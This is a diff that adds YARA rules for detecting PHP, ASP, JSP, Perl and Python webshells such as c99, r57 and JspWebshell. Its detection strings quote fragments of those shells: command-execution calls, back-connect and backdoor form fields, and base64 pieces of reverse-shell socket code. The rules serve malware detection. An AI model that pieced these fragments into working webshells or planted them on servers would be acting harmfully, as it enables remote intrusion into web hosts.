+		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
+		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"
+	condition:
+		1 of them
+}
+
+rule elmaliseker_asp {
+	meta:
+		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
+	strings:
+		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
+		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
+		$s2 = "dim zombie_array,special_array"
+		$s3 = "http://vnhacker.org"
+	condition:
+		1 of them
+}
+
+rule DxShell_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "33a2b31810178f4c2e71fbdeb4899244"
+	strings:
+		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
+		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"
+	condition:
+		1 of them
+}
+
+rule s72_Shell_v1_1_Coding_html {
+	meta:
+		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "c2e8346a5515c81797af36e7e4a3828e"
+	strings:
+		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
+		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
+		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""
+	condition:
+		1 of them
+}
+
+rule hidshell_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file hidshell.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "c2f3327d60884561970c63ffa09439a4"
+	strings:
+		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
+	condition:
+		all of them
+}
+
+rule Antichat_Shell_v1_3_php {
+	meta:
+		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "40d0abceba125868be7f3f990f031521"
+	strings:
+		$s0 = "Antichat"
+		$s1 = "Can't open file, permission denide"
+		$s2 = "$ra44"
+	condition:
+		2 of them
+}
+
+rule Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php {
+	meta:
+		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "49ad9117c96419c35987aaa7e2230f63"
+	strings:
+		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
+		$s1 = "Mode Shell v1.0</font></span>"
+		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."
+	condition:
+		1 of them
+}
+
+rule Worse_Linux_Shell_php {
+	meta:
+		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
+	strings:
+		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
+		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"
+	condition:
+		1 of them
+}
+
+rule cmd_asp_5_1_asp {
+	meta:
+		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
+	strings:
+		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
+		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
+	condition:
+		1 of them
+}
+
+rule pws_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file pws.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
+	strings:
+		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
+		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
+		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"
+	condition:
+		2 of them
+}
+
+rule PHP_Shell_php_php {
+	meta:
+		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
+	strings:
+		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
+		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
+	condition:
+		all of them
+}
+
+rule Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html {
+	meta:
+		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
+	strings:
+		$s0 = "Ayyildiz"
+		$s1 = "TouCh By iJOo"
+		$s2 = "First we check if there has been asked for a working directory"
+		$s3 = "http://ayyildiz.org/images/whosonline2.gif"
+	condition:
+		2 of them
+}
+
+rule Ajax_PHP_Command_Shell_php {
+	meta:
+		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "93d1a2e13a3368a2472043bd6331afe9"
+	strings:
+		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
+		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
+		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"
+	condition:
+		1 of them
+}
+
+rule JspWebshell_1_2_jsp {
+	meta:
+		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "70a0ee2624e5bbe5525ccadc467519f6"
+	strings:
+		$s0 = "JspWebshell"
+		$s1 = "CreateAndDeleteFolder is error:"
+		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
+		$s3 = "String _password =\"111\";"
+	condition:
+		2 of them
+}
+
+rule Phyton_Shell_py {
+	meta:
+		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "92b3c897090867c65cc169ab037a0f55"
+	strings:
+		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
+		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
+		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
+		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
+	condition:
+		1 of them
+}
+
+rule phpjackal_php {
+	meta:
+		description = "Semi-Auto-generated  - file phpjackal.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
+	strings:
+		$s3 = "$dl=$_REQUEST['downloaD'];"
+		$s4 = "else shelL(\"perl.exe $name $port\");"
+	condition:
+		1 of them
+}
+
+rule cgi_python_py {
+	meta:
+		description = "Semi-Auto-generated  - file cgi-python.py.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "0a15f473e2232b89dae1075e1afdac97"
+	strings:
+		$s0 = "a CGI by Fuzzyman"
+		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
+		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"
+	condition:
+		1 of them
+}
+
+rule DTool_Pro_php {
+	meta:
+		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "366ad973a3f327dfbfb915b0faaea5a6"
+	strings:
+		$s0 = "r3v3ng4ns\\nDigite"
+		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
+		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"
+	condition:
+		1 of them
+}
+
+rule telnetd_pl {
+	meta:
+		description = "Semi-Auto-generated  - file telnetd.pl.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "5f61136afd17eb025109304bd8d6d414"
+	strings:
+		$s0 = "0ldW0lf" fullword
+		$s1 = "However you are lucky :P"
+		$s2 = "I'm FuCKeD"
+		$s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
+		$s4 = "atrix@irc.brasnet.org"
+	condition:
+		1 of them
+}
+
+rule php_include_w_shell_php {
+	meta:
+		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "4e913f159e33867be729631a7ca46850"
+	strings:
+		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
+		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"
+	condition:
+		1 of them
+}
+
+rule Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php {
+	meta:
+		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "6163b30600f1e80d2bb5afaa753490b6"
+	strings:
+		$s0 = "Safe0ver" fullword
+		$s1 = "Script Gecisi Tamamlayamadi!"
+		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"
+	condition:
+		1 of them
+}
+
+rule ironshell_php {
+	meta:
+		description = "Semi-Auto-generated  - file ironshell.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
+	strings:
+		$s0 = "www.ironwarez.info"
+		$s1 = "$cookiename = \"wieeeee\";"
+		$s2 = "~ Shell I"
+		$s3 = "www.rootshell-team.info"
+		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"
+	condition:
+		1 of them
+}
+
+rule cmdjsp_jsp {
+	meta:
+		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "b815611cc39f17f05a73444d699341d4"
+	strings:
+		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
+		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
+		$s2 = "cmdjsp.jsp"
+		$s3 = "michaeldaw.org" fullword
+	condition:
+		2 of them
+}
+
+rule h4ntu_shell__powered_by_tsoi_ {
+	meta:
+		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "06ed0b2398f8096f1bebf092d0526137"
+	strings:
+		$s0 = "h4ntu shell"
+		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
+	condition:
+		1 of them
+}
+
+rule Ajan_asp {
+	meta:
+		description = "Semi-Auto-generated  - file Ajan.asp.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "b6f468252407efc2318639da22b08af0"
+	strings:
+		$s1 = "c:\\downloaded.zip"
+		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
+		$s3 = "http://www35.websamba.com/cybervurgun/"
+	condition:
+		1 of them
+}
+
+rule PHANTASMA_php {
+	meta:
+		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "52779a27fa377ae404761a7ce76a5da7"
+	strings:
+		$s0 = ">[*] Safemode Mode Run</DIV>"
+		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
+		$s2 = "[*] Spawning Shell"
+		$s3 = "Cha0s"
+	condition:
+		2 of them
+}
+
+rule simple_cmd_html {
+	meta:
+		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		hash = "c6381412df74dbf3bcd5a2b31522b544"
+	strings:
+		$s1 = "<title>G-Security Webshell</title>" fullword
+		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
+		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
+		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
+	condition:
+		all of them
+}
+
+rule multiple_webshells_0001 {
+	meta:
+		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_1_c2007_php_php_c100_php"
+		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
+		hash1 = "d089e7168373a0634e1ac18c0ee00085"
+		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"
+	strings:
+		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
+		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0002 {
+	meta:
+		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_nst_php_php_img_php_php_nstview_php_php"
+		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
+		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
+		hash2 = "4745d510fed4378e4b1730f56f25e569"
+	strings:
+		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
+		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
+		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0004 {
+	meta:
+		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SpecialShell_99_php_php"
+		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
+		hash1 = "3ca5886cd54d495dc95793579611f59a"
+		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash3 = "09609851caa129e40b0d56e90dfc476c"
+	strings:
+		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
+		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0007 {
+	meta:
+		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_r577_php_php_spy_php_php_s_php_php"
+		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
+		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
+		hash2 = "817671e1bdc85e04cc3440bbd9288800"
+	strings:
+		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
+		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0009 {
+	meta:
+		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php"
+		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
+		hash1 = "3ca5886cd54d495dc95793579611f59a"
+		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
+		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
+		hash5 = "09609851caa129e40b0d56e90dfc476c"
+	strings:
+		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
+		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0010 {
+	meta:
+		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_w_php_php_wacking_php_php_SpecialShell_99_php_php"
+		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
+		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash2 = "09609851caa129e40b0d56e90dfc476c"
+	strings:
+		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
+		$s2 = "c99sh_sqlquery"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0012 {
+	meta:
+		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_spy_php_php_s_php_php"
+		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
+		hash1 = "911195a9b7c010f61b66439d9048f400"
+		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
+		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
+		hash4 = "817671e1bdc85e04cc3440bbd9288800"
+	strings:
+		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
+		$s1 = ".$arrow.\"</b>\",in('text','"
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0013 {
+	meta:
+		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php"
+		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
+		hash1 = "911195a9b7c010f61b66439d9048f400"
+		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
+	strings:
+		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
+		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
+		$s2 = "rst.void.ru"
+	condition:
+		3 of them
+}
+
+rule multiple_webshells_0015 {
+	meta:
+		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_wacking_php_php_1_SpecialShell_99_php_php_c100_php"
+		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
+		hash2 = "09609851caa129e40b0d56e90dfc476c"
+		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"
+	strings:
+		$s0 = "if(eregi(\"./shbd $por\",$scan))"
+		$s1 = "$_POST['backconnectip']"
+		$s2 = "$_POST['backcconnmsg']"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0016 {
+	meta:
+		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_r577_php_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php"
+		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
+		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
+		hash2 = "8023394542cddf8aee5dec6072ed02b5"
+		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
+		hash4 = "817671e1bdc85e04cc3440bbd9288800"
+	strings:
+		$s1 = "if(rmdir($_POST['mk_name']))"
+		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
+		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0017 {
+	meta:
+		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_w_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php"
+		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
+		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
+		hash3 = "09609851caa129e40b0d56e90dfc476c"
+	strings:
+		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
+		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
+		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0018 {
+	meta:
+		description = "Semi-Auto-generated  - from files webadmin.php.php.txt, iMHaPFtp.php.php.txt, Private-i3lue.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_webadmin_php_php_iMHaPFtp_php_php_Private_i3lue_php"
+		hash0 = "b268e6fa3bf3fe496cffb4ea574ec4c7"
+		hash1 = "12911b73bc6a5d313b494102abcf5c57"
+		hash2 = "13f5c7a035ecce5f9f380967cf9d4e92"
+	strings:
+		$s0 = "return $type . $owner . $group . $other;" fullword
+		$s1 = "$owner  = ($mode & 00400) ? 'r' : '-';" fullword
+	condition:
+		all of them
+}
+
+rule multiple_php_webshells {
+	meta:
+		description = "Semi-Auto-generated  - from files multiple_php_webshells"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
+		hash1 = "911195a9b7c010f61b66439d9048f400"
+		hash2 = "be0f67f3e995517d18859ed57b4b4389"
+		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
+		hash4 = "8023394542cddf8aee5dec6072ed02b5"
+		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
+		hash6 = "817671e1bdc85e04cc3440bbd9288800"
+		hash7 = "7101fe72421402029e2629f3aaed6de7"
+		hash8 = "f618f41f7ebeb5e5076986a66593afd1"
+	strings:
+		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
+		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
+		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0020 {
+	meta:
+		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php"
+		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
+		hash1 = "3ca5886cd54d495dc95793579611f59a"
+		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
+		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
+	strings:
+		$s0 = "@ini_set(\"highlight" fullword
+		$s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
+		$s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0021 {
+	meta:
+		description = "Semi-Auto-generated  - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_GFS_web_shell_ver_3_1_7___PRiV8_php_nshell_php_php_gfs_sh_php_php"
+		hash0 = "be0f67f3e995517d18859ed57b4b4389"
+		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
+		hash2 = "f618f41f7ebeb5e5076986a66593afd1"
+	strings:
+		$s2 = "echo $uname.\"</font><br><b>\";" fullword
+		$s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
+		$s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0022 {
+	meta:
+		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_SpecialShell_99_php_php"
+		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
+		hash1 = "3ca5886cd54d495dc95793579611f59a"
+		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
+		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
+		hash4 = "09609851caa129e40b0d56e90dfc476c"
+	strings:
+		$s0 = "c99ftpbrutecheck"
+		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
+		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
+		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0025 {
+	meta:
+		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_c99shell_v1_0_php_php_c99php_SsEs_php_php"
+		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
+		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
+		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
+	strings:
+		$s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
+	condition:
+		1 of them
+}
+
+rule multiple_webshells_0027 {
+	meta:
+		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_nst_php_php_cybershell_php_php_img_php_php_nstview_php_php"
+		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
+		hash1 = "ef8828e0bc0641a655de3932199c0527"
+		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
+		hash3 = "4745d510fed4378e4b1730f56f25e569"
+	strings:
+		$s0 = "@$rto=$_POST['rto'];" fullword
+		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
+		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
+	condition:
+		2 of them
+}
+
+rule multiple_webshells_0029 {
+	meta:
+		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
+		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
+		super_rule = 1
+		was = "_c99shell_v1_0_php_php_c99php_1_c2007_php_php_c100_php"
+		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
